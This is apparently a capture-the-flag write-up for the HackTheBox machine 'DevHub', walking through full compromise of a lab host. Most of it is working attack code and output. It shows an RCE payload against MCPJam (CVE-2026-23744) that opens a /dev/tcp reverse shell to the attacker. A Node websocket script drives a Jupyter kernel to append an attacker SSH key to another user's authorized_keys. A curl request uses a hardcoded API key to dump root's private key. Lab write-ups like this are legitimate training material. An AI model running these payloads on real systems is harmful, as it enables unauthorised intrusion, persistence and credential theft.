---
title: DevHub HackTheBox Season11 
date: 2026-05-31 12:00:00 +/-TTTT
tags: [hackthebox]     # TAG names should always be lowercase
author: stapat
---

# DevHub HackTheBox Solution

- given the machine at ```10.129.59.57``` (yours will be different)

```bash
stapat@stapat:~$ rustscan -a 10.129.59.57
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
I scanned my computer so many times, it thinks we're dating.

[~] The config file is expected to be at "/home/stapat/snap/rustscan/436/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.129.59.57:22
Open 10.129.59.57:80
Open 10.129.59.57:6274
```

- on 80
 ![altalt](https://i.ibb.co/n8nRQ5s5/image.png)

- on 6274

![alt text](https://i.ibb.co/xKP56FTp/image-1.png)

- we see the version of MCPJam ```MCPJam Version: v1.4.2``` is vulnerable to RCE (CVE-2026-23744)
- [POC for the CVE](https://github.com/advisories/GHSA-232v-j27c-5pp6)

- so i tried to get the revshell with this payload (modified this wrt to the above)


```bash
  curl -X POST http://10.129.59.57:6274/api/mcp/connect   -H "Content-Type: application/json"   -d '{"serverConfig":{"command":"bash","args":["-c","bash -i >& /dev/tcp/10.10.14.167/4444 0>&1"],"env":{}},"serverId":"reee"}'

```


```bash
stapat@stapat:~$ nc -lvnp 4444
Listening on 0.0.0.0 4444
Connection received on 10.129.59.57 36294
bash: cannot set terminal process group (1084): Inappropriate ioctl for device
bash: no job control in this shell
mcp-dev@devhub:/opt/mcpjam/node_modules/@mcpjam/inspector$ whoami
whoami
mcp-dev
```

- there is a analyst user which we need to get in to
- there is a jupyter enviroment running
- so we know Jupyter kernels execute code as the notebook owner(analyst)
- and  REST API on 127.0.0.1:8888 is reachable from our shell


```bash
ps aux | grep analyst
analyst     1082  0.0  2.7 269580 109136 ?       Ssl  16:50   0:08 /home/analyst/jupyter-env/bin/python3 /home/analyst/jupyter-env/bin/jupyter-lab --ip=127.0.0.1 --port=8888 --no-browser --notebook-dir=/home/analyst/notebooks --ServerApp.token=REDACTED --ServerApp.password= --ServerApp.allow_origin= --ServerApp.disable_check_xsrf=False
```


- now we'll create a notebook session through the jupyter API -> get a valid kernel ID from the response -> send a jupyter execute_request message over websocket -> append your SSH key to authorized_keys of analyst


```bash
mcp-dev@devhub:~$ which node
which node
/usr/bin/node
```

- we have node so we'll use node's websocket for this


```bash
cat > ws.js << 'EOF'
const ws = new WebSocket("ws://127.0.0.1:8888/api/kernels/720ca89a-058e-4686-b587-1a761e9869a8/channels?token=REDACTED");

ws.onopen = () => {
    const payload = {
        header: {
            msg_id: "1",
            username: "x",
            session: "1",
            msg_type: "execute_request",
            version: "5.3"
        },
        parent_header: {},
        metadata: {},
        content: {
            code: `
import os

key = "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQDArUux6hy4G+Fc03mvt4MRgVmuuPIGTdnFWkJVO3itzylMOZUAy5P/s6sfzpTE08In05z3Qq4nEt2dRMJ1anle33hZGlNEddgHnPFMue3a0El/xIceD+WF9Dd23GpCb/EKcAQ2K1UhgHaYRT6T9S7zKUP+tiHyxUOU756o31TrZ1moqqxu8Iod4SnRG5gxe90248EH8LHkaxbV/aCc4jNmgqP5qb/80OEcOGU/R+M3TLV6APCkNCdh2Z4ywLhDLSXYN9lKuIjI+hYbbB7HD7/hd0H5zSxxcfdHaaayOH7iKjQLwiLhqhvV3M5N09/gE7+TbM2M07DGLyad59RU6if+SDApaGD/a97iQw8WKQnTfWhXnCrUefl+gxcfI/Gs+8eMBqlnZ+oO9nDNbHxLpqHhF+wiDYBxYgID/M+mqqbuFXMOkWEmuIJztnUVxzUzmf8H5GZnoX8F5fzwnv5tlm8InRlSaxjrgkH8gccstSb6ykyz9s3Z6NINOmom+exVS1myMp9Gk+evJHhDD1IxTXXC2qZF/cd2c8birpEqq1ATvdNjLwjHaqEp7Bs/3hqZgymrjxyOG+1N+6jM2EbBo5s27pbp+L58qARLkyeqVqjSExQbw5+bMYmhc/+MlxVCAvql2zn8lUsMWveYsziD+F+hETo7ApUtuZOcFM6eMpoNbQ== stapat@stapat"

os.makedirs("/home/analyst/.ssh", exist_ok=True)

with open("/home/analyst/.ssh/authorized_keys", "a") as f:
    f.write(key + "\\n")

os.chmod("/home/analyst/.ssh", 0o700)
os.chmod("/home/analyst/.ssh/authorized_keys", 0o600)

print("done")
`,
            silent: false
        },
        channel: "shell"
    };

    ws.send(JSON.stringify(payload));
};

ws.onmessage = (msg) => {
    console.log(msg.data);
};
EOF


mcp-dev@devhub:~$ node ws.js
node ws.js
{"header": {"msg_id": "66afc08f-694d73f14453345bcabb4c48_1777_17", "msg_type": "status", "username": "analyst", "session": "66afc08f-694d73f14453345bcabb4c48", "date": "2026-05-31T19:45:11.940623Z", "version": "5.4"}, "msg_id": "66afc08f-694d73f14453345bcabb4c48_1777_17", "msg_type": "status", "parent_header": {"msg_id": "e960fe94-82cbda5ff9fd338177451f9f_1082_1", "msg_type": "kernel_info_request", "username": "analyst", "session": "e960fe94-82cbda5ff9fd338177451f9f", "date": "2026-05-31T19:45:11.936469Z", "version": "5.4"}, "metadata": {}, "content": {"execution_state": "busy"}, "buffers": [], "channel": "iopub"}
{"header": {"msg_id": "66afc08f-694d73f14453345bcabb4c48_1777_19", "msg_type": "status", "username": "analyst", "session": "66afc08f-694d73f14453345bcabb4c48", "date": "2026-05-31T19:45:11.943325Z", "version": "5.4"}, "msg_id": "66afc08f-694d73f14453345bcabb4c48_1777_19", "msg_type": "status", "parent_header": {"msg_id": "e960fe94-82cbda5ff9fd338177451f9f_1082_1", "msg_type": "kernel_info_request", "username": "analyst", "session": "e960fe94-82cbda5ff9fd338177451f9f", "date": "2026-05-31T19:45:11.936469Z", "version": "5.4"}, "metadata": {}, "content": {"execution_state": "idle"}, "buffers": [], "channel": "iopub"}
{"header": {"msg_id": "66afc08f-694d73f14453345bcabb4c48_1777_20", "msg_type": "status", "username": "analyst", "session": "66afc08f-694d73f14453345bcabb4c48", "date": "2026-05-31T19:45:11.944832Z", "version": "5.4"}, "msg_id": "66afc08f-694d73f14453345bcabb4c48_1777_20", "msg_type": "status", "parent_header": {"msg_id": "e960fe94-82cbda5ff9fd338177451f9f_1082_0", "msg_type": "kernel_info_request", "username": "analyst", "session": "e960fe94-82cbda5ff9fd338177451f9f", "date": "2026-05-31T19:45:11.936071Z", "version": "5.4"}, "metadata": {}, "content": {"execution_state": "idle"}, "buffers": [], "channel": "iopub"}
{"header": {"msg_id": "66afc08f-694d73f14453345bcabb4c48_1777_21", "msg_type": "status", "username": "analyst", "session": "66afc08f-694d73f14453345bcabb4c48", "date": "2026-05-31T19:45:11.953102Z", "version": "5.4"}, "msg_id": "66afc08f-694d73f14453345bcabb4c48_1777_21", "msg_type": "status", "parent_header": {"msg_id": "1", "username": "x", "session": "1", "msg_type": "execute_request", "version": "5.3", "date": "2026-05-31T19:45:11.949197Z"}, "metadata": {}, "content": {"execution_state": "busy"}, "buffers": [], "channel": "iopub"}
{"header": {"msg_id": "66afc08f-694d73f14453345bcabb4c48_1777_22", "msg_type": "execute_input", "username": "analyst", "session": "66afc08f-694d73f14453345bcabb4c48", "date": "2026-05-31T19:45:11.953515Z", "version": "5.4"}, "msg_id": "66afc08f-694d73f14453345bcabb4c48_1777_22", "msg_type": "execute_input", "parent_header": {"msg_id": "1", "username": "x", "session": "1", "msg_type": "execute_request", "version": "5.3", "date": "2026-05-31T19:45:11.949197Z"}, "metadata": {}, "content": {"code": "\nimport os\n\nkey = \"ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQDArUux6hy4G+Fc03mvt4MRgVmuuPIGTdnFWkJVO3itzylMOZUAy5P/s6sfzpTE08In05z3Qq4nEt2dRMJ1anle33hZGlNEddgHnPFMue3a0El/xIceD+WF9Dd23GpCb/EKcAQ2K1UhgHaYRT6T9S7zKUP+tiHyxUOU756o31TrZ1moqqxu8Iod4SnRG5gxe90248EH8LHkaxbV/aCc4jNmgqP5qb/80OEcOGU/R+M3TLV6APCkNCdh2Z4ywLhDLSXYN9lKuIjI+hYbbB7HD7/hd0H5zSxxcfdHaaayOH7iKjQLwiLhqhvV3M5N09/gE7+TbM2M07DGLyad59RU6if+SDApaGD/a97iQw8WKQnTfWhXnCrUefl+gxcfI/Gs+8eMBqlnZ+oO9nDNbHxLpqHhF+wiDYBxYgID/M+mqqbuFXMOkWEmuIJztnUVxzUzmf8H5GZnoX8F5fzwnv5tlm8InRlSaxjrgkH8gccstSb6ykyz9s3Z6NINOmom+exVS1myMp9Gk+evJHhDD1IxTXXC2qZF/cd2c8birpEqq1ATvdNjLwjHaqEp7Bs/3hqZgymrjxyOG+1N+6jM2EbBo5s27pbp+L58qARLkyeqVqjSExQbw5+bMYmhc/+MlxVCAvql2zn8lUsMWveYsziD+F+hETo7ApUtuZOcFM6eMpoNbQ== stapat@stapat\"\n\nos.makedirs(\"/home/analyst/.ssh\", exist_ok=True)\n\nwith open(\"/home/analyst/.ssh/authorized_keys\", \"a\") as f:\n    f.write(key + \"\\n\")\n\nos.chmod(\"/home/analyst/.ssh\", 0o700)\nos.chmod(\"/home/analyst/.ssh/authorized_keys\", 0o600)\n\nprint(\"done\")\n", "execution_count": 2}, "buffers": [], "channel": "iopub"}
{"header": {"msg_id": "66afc08f-694d73f14453345bcabb4c48_1777_23", "msg_type": "stream", "username": "analyst", "session": "66afc08f-694d73f14453345bcabb4c48", "date": "2026-05-31T19:45:11.959323Z", "version": "5.4"}, "msg_id": "66afc08f-694d73f14453345bcabb4c48_1777_23", "msg_type": "stream", "parent_header": {"msg_id": "1", "date": "2026-05-31T19:45:11.949197Z", "username": "x", "session": "1", "version": "5.3", "msg_type": "execute_request"}, "metadata": {}, "content": {"name": "stdout", "text": "done\n"}, "buffers": [], "channel": "iopub"}
{"header": {"msg_id": "66afc08f-694d73f14453345bcabb4c48_1777_24", "msg_type": "execute_reply", "username": "analyst", "session": "66afc08f-694d73f14453345bcabb4c48", "date": "2026-05-31T19:45:11.963269Z", "version": "5.4"}, "msg_id": "66afc08f-694d73f14453345bcabb4c48_1777_24", "msg_type": "execute_reply", "parent_header": {"msg_id": "1", "username": "x", "session": "1", "msg_type": "execute_request", "version": "5.3", "date": "2026-05-31T19:45:11.949197Z"}, "metadata": {"started": "2026-05-31T19:45:11.953473Z", "dependencies_met": true, "engine": "9700056d-6b61-4f58-9cad-30091df0ec79", "status": "ok"}, "content": {"status": "ok", "execution_count": 2, "user_expressions": {}, "payload": []}, "buffers": [], "channel": "shell"}
{"header": {"msg_id": "66afc08f-694d73f14453345bcabb4c48_1777_25", "msg_type": "status", "username": "analyst", "session": "66afc08f-694d73f14453345bcabb4c48", "date": "2026-05-31T19:45:11.964756Z", "version": "5.4"}, "msg_id": "66afc08f-694d73f14453345bcabb4c48_1777_25", "msg_type": "status", "parent_header": {"msg_id": "1", "username": "x", "session": "1", "msg_type": "execute_request", "version": "5.3", "date": "2026-05-31T19:45:11.949197Z"}, "metadata": {}, "content": {"execution_state": "idle"}, "buffers": [], "channel": "iopub"}

```
- now our work is done 


```bash
stapat@stapat:~$ ssh analyst@10.129.59.57
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-179-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Sun May 31 07:46:47 PM UTC 2026

  System load:           0.0
  Usage of /:            77.5% of 9.50GB
  Memory usage:          28%
  Swap usage:            0%
  Processes:             236
  Users logged in:       2
  IPv4 address for eth0: 10.129.59.57
  IPv6 address for eth0: dead:beef::250:56ff:feb9:7b00


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

1 additional security update can be applied with ESM Apps.
Learn more about enabling ESM Apps service at https://ubuntu.com/esm

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Sun May 31 19:46:48 2026 from 10.10.14.167
analyst@devhub:~$ 
```
- after analyzing analyst for a while and searching for aspects for priv escalation i got a file in ```/opt/opsmcp/server.py``` (owned by analyst)

- the root service exposes a localhost API on port 5000 with a hardcoded API key and a admin tool that dumps private key for root

```bash
curl -s http://127.0.0.1:5000/tools/call \
  -H "Content-Type: application/json" \
  -H "X-API-Key: REDD" \
  -d '{
    "name":"ops._admin_dump",
    "arguments":{
      "target":"ssh_keys",
      "confirm":true
    }
  }'

{"note":"Emergency recovery key dump","root_private_key":"-----BEGIN OPENSSH PRIVATE KEY----------END OPENSSH PRIVATE KEY-----\n","target":"ssh_keys"}
```

- got root